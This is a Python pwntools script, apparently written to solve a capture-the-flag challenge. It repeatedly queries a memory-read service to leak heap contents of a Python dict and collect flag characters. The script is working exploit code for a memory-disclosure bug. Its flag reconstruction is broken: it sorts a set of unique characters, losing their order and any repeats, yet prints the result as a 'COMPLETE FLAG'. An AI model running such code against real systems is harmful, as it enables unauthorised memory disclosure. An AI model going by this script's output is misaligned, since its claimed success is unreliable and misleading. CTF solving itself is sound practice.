from pwn import *
import re
import time
import json

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

def single_scan_session():
    """Run one scanning session and return found characters"""
    try:
        context.log_level = 'error'  # Reduce noise
        io = remote(HOST, PORT, ssl=True)
        
        # Get dict address
        intro = io.recvline_contains(b'flag is over at').decode()
        banner2 = io.recvline().decode()
        
        m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
        if not m:
            io.close()
            return set(), {}
            
        dict_obj_addr = int(m.group(1), 16)
        
        def read_memory(addr):
            addr_str = f"{addr:x}"
            io.sendline(addr_str.encode())
            line = io.recvline(timeout=2).decode().strip()
            
            if 'illegal memory address' in line:
                return None
                
            parts = line.split(': ')
            if len(parts) >= 2:
                hex_data = parts[-1].strip()
                try:
                    return bytes.fromhex(hex_data)
                except:
                    return None
            return None
        
        # Get ma_keys pointer
        ma_keys_data = read_memory(dict_obj_addr + 0x20)
        if not ma_keys_data:
            io.close()
            return set(), {}
            
        ma_keys_ptr = u64(ma_keys_data)
        
        found_chars = set()
        reads_used = 1
        max_reads = 45
        
        # Try multiple scanning strategies in one session
        scan_ranges = [
            # Dense scan around keys
            (0x50, 0x300, 8),
            # Wider scan with larger steps  
            (0x300, 0x800, 16),
            # Scan before keys object
            (-0x100, 0x50, 8)
        ]
        
        for start_off, end_off, step in scan_ranges:
            if reads_used >= max_reads - 5:
                break
                
            for offset in range(start_off, end_off, step):
                if reads_used >= max_reads - 3:
                    break
                    
                scan_addr = ma_keys_ptr + offset
                if scan_addr <= 0x1000:
                    continue
                    
                data = read_memory(scan_addr)
                reads_used += 1
                
                if data:
                    ptr_val = u64(data)
                    
                    # Check for heap pointers
                    if 0x400000 < ptr_val < 0x800000000000 and reads_used < max_reads - 2:
                        # Try multiple string offsets
                        for str_offset in [0x20, 0x28, 0x30, 0x38, 0x40]:
                            if reads_used >= max_reads - 1:
                                break
                                
                            str_data = read_memory(ptr_val + str_offset)
                            reads_used += 1
                            
                            if str_data:
                                found_any = False
                                for i, b in enumerate(str_data):
                                    if 32 <= b <= 126:
                                        char = chr(b)
                                        # Focus on flag-relevant characters
                                        if (char.isalnum() or 
                                            char in '{}_.,-!@#$%^&*()[]|\\:;"<>?/~`'):
                                            found_chars.add(char)
                                            found_any = True
                                    elif b == 0:
                                        break
                                
                                # If we found chars, don't need to try other offsets
                                if found_any:
                                    break
        
        io.close()
        return found_chars, {'reads_used': reads_used}
        
    except Exception as e:
        try:
            io.close()
        except:
            pass
        return set(), {'error': str(e)}

# Load previous results if they exist
try:
    with open('flag_aggregation_results.json', 'r') as f:
        previous_results = json.load(f)
        existing_chars = set(previous_results['all_characters'])
        print(f"Loaded previous results: {len(existing_chars)} characters")
        print(f"Previous chars: {''.join(sorted(existing_chars))}")
except:
    existing_chars = set()
    print("No previous results found, starting fresh")

# Target the missing characters we need
missing_critical = set('C{}') - existing_chars
print(f"Critical missing characters: {sorted(missing_critical)}")

print(f"\n=== EXTENDED MULTI-SESSION AGGREGATION ===")
print(f"Running additional sessions to find missing characters...")

all_chars = existing_chars.copy()
new_session_results = []

# Run more sessions with focus on finding the missing characters
for session_num in range(10):  # Run 10 more sessions
    print(f"\nExtended Session {session_num + 1}/10:")
    
    chars, metadata = single_scan_session()
    
    if chars:
        new_chars = chars - all_chars
        all_chars.update(chars)
        
        print(f"  Found: {len(chars)} chars")
        if new_chars:
            print(f"  New: {sorted(new_chars)}")
            # Highlight if we found critical missing chars
            critical_found = new_chars & missing_critical
            if critical_found:
                print(f"  *** CRITICAL FOUND: {sorted(critical_found)} ***")
        else:
            print(f"  No new characters")
            
        new_session_results.append({
            'session': session_num + 1,
            'chars': sorted(chars),
            'new_chars': sorted(new_chars)
        })
    else:
        error = metadata.get('error', 'Unknown error')
        print(f"  Failed: {error}")
    
    # Check if we have all critical characters
    still_missing = missing_critical - all_chars
    if not still_missing:
        print(f"  *** ALL CRITICAL CHARACTERS FOUND! ***")
        break
        
    time.sleep(0.5)  # Short delay

print(f"\n" + "="*60)
print(f"FINAL AGGREGATION RESULTS")
print(f"="*60)

sorted_chars = sorted(all_chars)
print(f"\nTotal unique characters: {len(all_chars)}")
print(f"All characters: {sorted_chars}")
print(f"Combined string: {''.join(sorted_chars)}")

# Final flag structure analysis
flag_structure = {
    'K': 'K' in all_chars,
    'C': 'C' in all_chars,
    'S': 'S' in all_chars, 
    '{': '{' in all_chars,
    '}': '}' in all_chars
}

print(f"\nFlag structure analysis:")
for char, present in flag_structure.items():
    status = "✓" if present else "✗"
    print(f"  '{char}': {status}")

complete_structure = all(flag_structure.values())
print(f"\nComplete KCSC{{}} structure: {'✓' if complete_structure else '✗'}")

# Construct the flag
if complete_structure:
    # Remove KCSC{} from the character list and use the rest as content
    content_chars = [c for c in sorted_chars if c not in 'KCSC{}']
    flag_content = ''.join(content_chars)
    constructed_flag = f"KCSC{{{flag_content}}}"
    print(f"\n🏁 COMPLETE FLAG: {constructed_flag}")
    
elif len(all_chars) >= 20:
    combined = ''.join(sorted_chars)
    print(f"\n🏁 FLAG CANDIDATE: {combined}")
    
    # Try partial constructions
    if 'K' in all_chars and 'S' in all_chars:
        if '{' in all_chars or '}' in all_chars:
            content = ''.join(c for c in sorted_chars if c not in 'KS{}C')
            print(f"   Partial KCSC: KCSC{{{content}}}")
        else:
            content = ''.join(c for c in sorted_chars if c not in 'KSC')
            print(f"   Without braces: KSC{content} (missing braces)")

# Save updated results
updated_results = {
    'all_characters': sorted_chars,
    'combined_string': ''.join(sorted_chars),
    'flag_structure': flag_structure,
    'total_sessions': len(new_session_results),
    'final_char_count': len(all_chars)
}

with open('final_flag_results.json', 'w') as f:
    json.dump(updated_results, f, indent=2)

print(f"\nFinal results saved to: final_flag_results.json")

# Final status
missing_chars = set('KCSC{}') - all_chars
if missing_chars:
    print(f"\nStill missing: {sorted(missing_chars)}")
    print("Consider running more sessions or manual exploration for these characters.")
else:
    print(f"\n🎉 ALL CRITICAL FLAG STRUCTURE CHARACTERS FOUND!")